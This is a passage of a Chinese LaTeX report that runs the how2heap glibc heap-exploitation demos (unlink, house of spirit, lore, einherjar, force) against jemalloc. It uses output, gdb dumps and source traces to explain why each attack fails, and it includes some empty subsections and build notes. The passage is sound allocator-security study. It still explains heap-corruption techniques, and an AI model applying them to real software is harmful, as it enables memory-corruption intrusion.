由于jemalloc的实现和ptmalloc并不相同,没有采用边界标记来在堆分配的时候标记数据,而是使用了bitmap标记内存的使用情况,因此jemalloc对unlink攻击免疫,所以unlink攻击无法成功。
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./unsafe_unlink
The global chunk0_ptr is at 0x601070, pointing to 0x7ff94e61e000
The victim chunk we are going to corrupt is at 0x7ff94e61e080

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: AAAAAAAA

\end{minted}

\subsection{house\_of\_spirit}

攻击失败,运行结果如下:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./house_of_spirit
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffd67374070
The second one: 0x7ffd67374090
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffd67374070.
Freeing the overwritten pointer.
<jemalloc>: src/rtree.c:205: Failed assertion: "!dependent || leaf != NULL"
[1]    27382 abort      ./house_of_spirit

\end{minted}

free时会调用jemalloc中的\verb+ free()+,跟踪进入\verb+ free()+调用的\verb+ ifree()+:
\begin{minted}[breaklines, frame=lines]{c}
ifree(tsd=0x7ffff7fde728, ptr=0x7fffffffe480, tcache=0x7ffff7fde8e0, slow_path=0x1);
\end{minted}

继续跟入,\verb+ tsd_tsdn()+函数十分简洁,且作用是强制类型转换,我们可以略过,进入\verb+ ifree()+中调用的\verb+ idalloctm()+函数,再进入\verb+ arena_dalloc()+:
\begin{minted}[breaklines, frame=lines]{c}
// arena_dalloc(tsdn=0x7ffff7fde728, ptr=0x7fffffffe480, tcache=0x7ffff7fde8e0, alloc_ctx=0x7fffffffe3f0, slow_path=0x1)
    // config_debug = 1, 进入
    if (config_debug) {
        rtree_ctx = tsd_rtree_ctx(tsdn_tsd(tsdn));
        // extent=0x00007fffffffe348  →  [...]  →  0x0000000100000101, tsdn=0x00007fffffffe328  →  [...]  →  0x0000000100000101
        extent_t *extent = rtree_extent_read(tsdn, &extents_rtree,
            rtree_ctx, (uintptr_t)ptr, true);
        // extent=0x00007fffffffe348  →  0x0000000000000000
        assert(szind == extent_szind_get(extent));
        assert(szind < NSIZES);
        assert(slab == extent_slab_get(extent));
    }
    // 略去无关函数
\end{minted}

我们在\verb+ extent_szind_get(extent)+函数中调用的\verb+ extent_szind_get_maybe_invalid(extent)+中有如下操作:
\begin{minted}[breaklines, frame=lines]{c}
    static inline szind_t
        extent_szind_get_maybe_invalid(const extent_t *extent) {
        // extent=0x00007fffffffe2a8  →  0x0000000000000000
        szind_t szind = (szind_t)((extent->e_bits & EXTENT_BITS_SZIND_MASK) >>
            EXTENT_BITS_SZIND_SHIFT);
        assert(szind <= NSIZES);
        return szind;
}

\end{minted}

extent的值由\verb+ 0x00007fffffffe2a8+变成了一个非法地址\verb+ 0x0000000000000000+,因此\verb+ extent->e_bits+无法计算,所以,\verb+ szind+的值与\verb+ NSIZES+(该值此时为0xE8)无法比较,因此程序收到终止信号,程序退出。

\subsection{house\_of\_lore}

攻击失败:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./house_of_lore 
Allocated the victim (small) chunk: 0x7fd6d8878000
stack_buffer_1: 0x7ffd6419e2a0
stack_buffer_2: 0x7ffd6419e280

Freeing the victim chunk 0x7fd6d8878000, it will be inserted in the unsorted bin
victim->fd: 0x5a5a5a5a5a5a5a5a
victim->bk: 0x5a5a5a5a5a5a5a5a

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x7fd6d887a000
The victim chunk 0x7fd6d8878000 will be inserted in front of the SmallBin
victim->fd: 0x5a5a5a5a5a5a5a5a
victim->bk: 0x5a5a5a5a5a5a5a5a

Now emulating a vulnerability that can overwrite the victim->bk pointer
This last malloc should return a chunk at the position injected in bin->bk: 0x7fd6d8878000
The fd pointer of stack_buffer_2 has changed: 0x7ffd6419e2a0

\end{minted}

gdb打开应用,在free之前下断点,堆布局是这样的:
\begin{minted}[breaklines, frame=lines]{c}
gef> x/20gx victim-2
0x7ffff64a4ff0: 0x0000000000000000  0x0000000000000000
0x7ffff64a5000: 0x4141414141414141  0x4141414141414141
...           : ...                 ..
0x7ffff64a5070: 0x4141414141414141  0x4141414141414141
0x7ffff64a5080: 0x0000000000000000  0x0000000000000000
\end{minted}

之前就已经提到过,jemalloc没有采用边界标记法表示内存,因此没有在分配内存的附近有标记,如果使用glibc的堆布局就如下所示:
\begin{minted}[breaklines, frame=lines]{c}
gef> x/20gx victim-2
0x603000:   0x0000000000000000  0x0000000000000091 <- size
0x603010:   0x4141414141414141  0x4141414141414141
...     :   ...                 ...
0x603080:   0x4141414141414141  0x4141414141414141
0x603090:   0x0000000000000000  0x0000000000000021 <- next size
\end{minted}

\verb+ free()+之后,我们的堆布局变成了下面的样子:
\begin{minted}[breaklines, frame=lines]{bash}
gef> x/20gx victim-2
0x7ffff64a4ff0: 0x0000000000000000  0x0000000000000000
0x7ffff64a5000: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
...           : ...                 ...
0x7ffff64a5070: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
0x7ffff64a5080: 0x0000000000000000  0x0000000000000000
\end{minted}

jemalloc在free某块内存之后,不仅会在bitmap中标记,还会填充特定的字符,因此攻击失效。

\subsection{house\_of\_einherjar}

前面的分析已经提到过,house-of-einherjar 是一种利用 malloc 来返回一个附近地址的任意指针。它要求有一个单字节溢出漏洞,覆盖掉\verb+ next chunk+的 \verb+ size+字段并清除\verb+ PREV_IN_USE+标志。jemalloc没有采用边界标记的方法标记\verb+ free chunks+,因此本次攻击也是不成功的。
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./house_of_einherjar
We allocate 0x10 bytes for 'a': 0x7f6121abf000

Our fake chunk at 0x7ffe5fe58050 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffe5fe58050
bck: 0x7ffe5fe58050
fwd_nextsize: 0x7ffe5fe58050
bck_nextsize: 0x7ffe5fe58050

We allocate 0xf8 bytes for 'b': 0x7f6121ac0000
b.size: 0
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x7f6121abfff0 - 0x7ffe5fe58050 = 0xffffff62c1c67fa0

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffffff62c1c67fa0 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x7f6121abf010
\end{minted}

在分配\verb+ b+时下断点,查看堆布局:
\begin{minted}[breaklines, frame=lines]{bash}
gef$ x/50gx b-0x10
0x7ffff64a5ff0: 0x0000000000000000  0x0000000000000000
0x7ffff64a6000: 0xa5a5a5a5a5a5a5a5  0xa5a5a5a5a5a5a5a5
...           : ...                 ...
0x7ffff64a60f0: 0xa5a5a5a5a5a5a5a5  0xa5a5a5a5a5a5a5a5
0x7ffff64a6100: 0x0000000000000000  0x0000000000000000
\end{minted}

而使用glibc分配的内存如下所示:
\begin{minted}[breaklines, frame=lines]{bash}
gef$ x/50gx b-0x10
0x603020:   0x4141414141414141  0x0000000000000101 <- P flag
0x603030:   0x0000000000000000  0x0000000000000000 -
...     :   ...                 ...                | <- chunk b
0x603120:   0x0000000000000000  0x0000000000020ee1 -
0x603130:   0x0000000000000000  0x0000000000000000
\end{minted}

综上,本次攻击也是失败的。

\subsection{house\_of\_orange}

运行程序没有任何输出,自然是攻击失败:
\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./house_of_orange
$ how2heap 

\end{minted}

\subsection{house\_of\_force}

攻击失败:

\begin{minted}[breaklines, frame=lines]{bash}
$ how2heap ./house_of_force 
We will overwrite a variable at 0x602080

Let's allocate the first chunk of 0x10 bytes: 0x7f35be7cf000.
Real size of our allocated chunk is 0x10.

Overwriting the top chunk size with a big value so the malloc will never call mmap.
Old size of top chunk: 0
New size of top chunk: 0xffffffffffffffff

The value we want to write to at 0x602080, and the top chunk is at 0x7f35be7cf010, so accounting for the header size, we will malloc 0xffff80ca41e33060 bytes.
[1]    12108 segmentation fault  ./house_of_force

\end{minted}

\subsection{poison\_null\_byte}

\subsection{unsorted\_bin\_attack}

\subsection{unsorted\_bin\_into\_stack}

\subsection{fastbin\_dup}

\subsection{fastbin\_dup\_into\_stack}

\subsection{overlapping\_chunks}

\subsection{overlapping\_chunks\_2}

\subsection{Conclusion}

\newpage

% Section 5
% \begin{center}
    \section{遇到的坑}
\end{center}

\setlength{\parindent}{2em}
\subsection{jemalloc的安装}
jemalloc自己实现了对glibc中的malloc函数的hook操作,于是我们可以直接下载jemalloc,解压至指定目录,使用参数\Verb+./configure --prefix=/path --enable-debug+就可以得到有调试符号的jemalloc了。

然后我们就可以通过在\Verb+ /etc/ld.so.conf+中添加编译好jemalloc的位置,保存之后运行命令\Verb+ ldconfig+,编译程序的时候就可以使用动态链接库的方式链接了(如下代码第3、4行所示):
\begin{minted}[breaklines, frame=lines, linenos]{makefile}
PROGRAMS = fastbin_dup fastbin_dup_into_stack fastbin_dup_consolidate unsafe_unlink house_of_spirit poison_null_byte malloc_playground first_fit house_of_lore overlapping_chunks overlapping_chunks_2 house_of_force unsorted_bin_attack house_of_einherjar house_of_orange
CFLAGS += -std=c99 -g3
LDFLAGS += -L/usr/local/jemalloc/lib
LDLIBS += -ljemalloc

all: $(PROGRAMS)
clean:
    rm -f $(PROGRAMS)
\end{minted}

\subsection{在Ubuntu 16.04下使用高版本Glibc}
Ubuntu自带的glibc版本是2.23, 我们在不替换原系统glib的情况下,若要使用高版本glibc当作共享链接库,则\textbf{万万不可像jemalloc那样运行\Verb+ ldconfig+}。

原因是,glibc并不单纯的包含libc.so.2,而是包含了该对应版本的链接器等一系列工具链,如果我们此时还在使用旧版本的glibc,而运行了\Verb+ ldconfig+之后,就会造成系统的共享链接库错误,此时唯一的解决办法是重新安装系统。因此如果使用高版本的glibc共享库的话,我们就需要指定额外的参数传递给gcc编译器: 
\begin{minted}[breaklines, frame=lines]{bash}
$ gcc -g3 -L/root/tmpwork/g227/lib -Wl,--rpath=/root/tmpwork/g227/lib -Wl,--dynamic-linker=/root/tmpwork/g227/lib/ld-linux-x86-64.so.2 house_of_einherjar.c -o house_of_einherjar

$ ldd house_of_einherjar                                                                                                                                                   
    linux-vdso.so.1 =>  (0x00007ffe979ef000)
    libc.so.6 => /root/tmpwork/g227/lib/libc.so.6 (0x00007fb64da78000)
    /root/tmpwork/g227/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fb64de2d000)

\end{minted}

其中,\Verb+ -Wl+指的是将该参数传递给链接器,我们在编译时指定了所使用的动态链接库,以及和该版本动态链接库对应的链接器。这样,程序就可以使用高版本的glibc了。

\newpage

% Section 6 Refenence
% \begin{thebibliography}{}  
\bibitem[1]{1} Glibc Source Code, \url{https://ftp.gnu.org/gnu/glibc/}
\bibitem[2]{2} jemalloc Source Code, \url{https://github.com/jemalloc/jemalloc}
\bibitem[3]{3} Phrack Magazine Volume 0x0d, Issue 0x42, Phile \#0x0A of 0x11, \url{http://phrack.org/issues/66/10.html}
\bibitem[3]{3} Phrack Magazine Volume 0x0e, Issue 0x44, Phile \#0x0A of 0x13, \url{http://phrack.org/issues/68/10.html}
\bibitem[4]{4} GitHub 开源书籍 CTF-All-In-One, \url{https://github.com/firmianay/CTF-All-In-One}
\bibitem[5]{5} 裴中煜,张超,段海新.Glibc堆利用的若干方法[J].信息安全学报,2018,3(01):1-15.
\bibitem[6]{6} JEMALLOC IMPLEMENTATION NOTES, http://jemalloc.net/jemalloc.3.html
\end{thebibliography}




\end{document}
